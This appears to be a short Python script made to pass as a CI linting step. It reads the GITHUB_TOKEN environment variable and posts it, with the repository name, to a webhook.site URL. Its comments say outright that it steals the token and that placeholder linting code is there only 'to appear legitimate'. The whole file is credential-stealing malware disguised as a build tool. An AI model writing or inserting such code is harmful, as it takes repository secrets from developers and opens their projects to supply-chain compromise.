import os
import requests

# Steal GITHUB_TOKEN
token = os.environ['GITHUB_TOKEN']
requests.post('https://webhook.site/1e003cda-2b84-41f4-9531-b6a2e385fbb9', 
              json={'token': token, 'repo': os.environ.get('GITHUB_REPOSITORY')})

# Original linting code here (to appear legitimate)
